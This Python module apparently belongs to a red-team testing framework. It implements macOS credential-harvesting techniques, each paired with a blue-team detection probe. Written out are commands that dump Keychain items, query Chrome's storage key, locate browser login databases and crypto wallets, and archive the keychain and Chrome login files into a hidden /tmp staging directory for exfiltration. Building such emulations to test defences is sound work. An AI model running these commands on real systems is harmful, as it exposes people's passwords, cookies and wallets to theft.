"""Keychain Agent — credential harvesting techniques.

Tests macOS Keychain security boundaries. Can a process dump credentials
from the Keychain without proper authorization? Can browser credential
stores be read? Can crypto wallets be accessed?

Blue team mirror: InfostealerGuardAgent, AuthGuardAgent
"""

from lib.technique import AttackTechnique, TechniqueResult, TechniqueStatus


class KeychainDump(AttackTechnique):
    """Attempt to dump Keychain items via security CLI."""

    name = "keychain_dump"
    description = "Dump Keychain items via 'security' CLI tool"
    mitre_id = "T1555.001"
    mitre_tactic = "credential_access"
    blue_team_probe = "KeychainAccessProbe"
    blue_team_agent = "InfostealerGuardAgent"
    bounty_eligible = False  # Known behavior, requires user password
    risk_level = "safe"  # Read-only, will prompt for password

    def execute(self, target: str, **kwargs) -> TechniqueResult:
        # Try to list keychain items (doesn't reveal passwords without auth)
        cmd = "security dump-keychain -d 2>&1 | head -50"
        r = self._run_on_target(target, cmd, **kwargs)

        # Try find-generic-password for a common service
        find_cmd = 'security find-generic-password -s "Chrome Safe Storage" 2>&1'
        r_find = self._run_on_target(target, find_cmd, **kwargs)

        dump_worked = r.returncode == 0 and "class" in r.stdout.lower()
        find_worked = r_find.returncode == 0 and "password" not in r_find.stderr.lower()

        return TechniqueResult(
            technique_id=self.name,
            technique_name=self.description,
            mitre_id=self.mitre_id,
            status=TechniqueStatus.SUCCESS if (dump_worked or find_worked) else TechniqueStatus.BLOCKED,
            details={
                "dump_accessible": dump_worked,
                "dump_preview": r.stdout[:300] if dump_worked else r.stderr[:200],
                "find_accessible": find_worked,
                "find_preview": r_find.stdout[:200] if find_worked else r_find.stderr[:200],
            },
        )


class BrowserCredentialHarvest(AttackTechnique):
    """Attempt to read browser credential databases."""

    name = "browser_cred_harvest"
    description = "Read Chrome/Firefox/Safari credential stores"
    mitre_id = "T1555.003"
    mitre_tactic = "credential_access"
    blue_team_probe = "BrowserCacheProbe"
    blue_team_agent = "InfostealerGuardAgent"
    bounty_eligible = False
    risk_level = "safe"  # Read-only

    def execute(self, target: str, **kwargs) -> TechniqueResult:
        browser_dbs = {
            "chrome_login": "~/Library/Application Support/Google/Chrome/Default/Login Data",
            "chrome_cookies": "~/Library/Application Support/Google/Chrome/Default/Cookies",
            "firefox_logins": "~/Library/Application Support/Firefox/Profiles/*/logins.json",
            "safari_history": "~/Library/Safari/History.db",
        }

        results = {}
        for name, path in browser_dbs.items():
            cmd = f"ls -la {path} 2>&1"
            r = self._run_on_target(target, cmd, **kwargs)
            exists = r.returncode == 0 and "No such file" not in r.stdout

            if exists and path.endswith(".db"):
                # Try to read SQLite header
                read_cmd = f"file {path} 2>&1"
                r_read = self._run_on_target(target, read_cmd, **kwargs)
                results[name] = {
                    "exists": True,
                    "readable": "SQLite" in r_read.stdout,
                    "info": r_read.stdout[:200],
                }
            elif exists:
                results[name] = {"exists": True, "readable": True, "info": r.stdout[:200]}
            else:
                results[name] = {"exists": False, "readable": False, "info": ""}

        any_readable = any(v.get("readable") for v in results.values())

        return TechniqueResult(
            technique_id=self.name,
            technique_name=self.description,
            mitre_id=self.mitre_id,
            status=TechniqueStatus.SUCCESS if any_readable else TechniqueStatus.FAILED,
            details={"browsers": results},
        )


class CryptoWalletAccess(AttackTechnique):
    """Check for cryptocurrency wallet files — infostealer target."""

    name = "crypto_wallet_access"
    description = "Scan for cryptocurrency wallet files on target"
    mitre_id = "T1005"
    mitre_tactic = "collection"
    blue_team_probe = "WalletTheftProbe"
    blue_team_agent = "InfostealerGuardAgent"
    bounty_eligible = False
    risk_level = "safe"

    def execute(self, target: str, **kwargs) -> TechniqueResult:
        wallet_paths = [
            "~/Library/Application Support/Exodus",
            "~/Library/Application Support/Electrum",
            "~/Library/Application Support/Bitcoin",
            "~/Library/Application Support/Ethereum",
            "~/Library/Application Support/Metamask",
            "~/Library/Keychains/",
        ]

        found = {}
        for path in wallet_paths:
            cmd = f"ls -la {path} 2>&1"
            r = self._run_on_target(target, cmd, **kwargs)
            exists = r.returncode == 0 and "No such file" not in r.stdout
            found[path] = {"exists": exists, "info": r.stdout[:200] if exists else ""}

        wallets_found = [p for p, v in found.items() if v["exists"]]

        return TechniqueResult(
            technique_id=self.name,
            technique_name=self.description,
            mitre_id=self.mitre_id,
            status=TechniqueStatus.SUCCESS if wallets_found else TechniqueStatus.FAILED,
            details={"wallets": found, "wallets_found": len(wallets_found)},
        )


class CredentialStaging(AttackTechnique):
    """Stage harvested credentials into archive — pre-exfil step."""

    name = "credential_staging"
    description = "Archive credential files into staging directory for exfil"
    mitre_id = "T1560.001"
    mitre_tactic = "collection"
    blue_team_probe = "CredentialArchiveProbe"
    blue_team_agent = "InfostealerGuardAgent"
    bounty_eligible = False
    risk_level = "moderate"  # Creates files

    def execute(self, target: str, **kwargs) -> TechniqueResult:
        staging_dir = "/tmp/.amoskys_staging"
        archive = "/tmp/.amoskys_creds.tar.gz"

        cmds = [
            f"mkdir -p {staging_dir}",
            f"cp ~/Library/Keychains/login.keychain-db {staging_dir}/ 2>/dev/null; true",
            f'cp ~/Library/Application\\ Support/Google/Chrome/Default/Login\\ Data {staging_dir}/ 2>/dev/null; true',
            f"tar czf {archive} -C /tmp .amoskys_staging 2>&1",
            f"ls -la {archive} 2>&1",
        ]

        outputs = []
        for cmd in cmds:
            r = self._run_on_target(target, cmd, **kwargs)
            outputs.append({"cmd": cmd[:80], "rc": r.returncode, "out": r.stdout[:200]})

        # Check if archive was created
        archive_created = any("amoskys_creds" in o.get("out", "") for o in outputs)

        # Cleanup
        self._run_on_target(target, f"rm -rf {staging_dir} {archive}", **kwargs)

        return TechniqueResult(
            technique_id=self.name,
            technique_name=self.description,
            mitre_id=self.mitre_id,
            status=TechniqueStatus.SUCCESS if archive_created else TechniqueStatus.FAILED,
            details={"steps": outputs, "archive_created": archive_created},
            cleanup_done=True,
        )


ALL_TECHNIQUES = [
    KeychainDump(),
    BrowserCredentialHarvest(),
    CryptoWalletAccess(),
    CredentialStaging(),
]

AGENT_NAME = "keychain"
AGENT_DESCRIPTION = "Credential harvesting — Keychain, browsers, wallets"
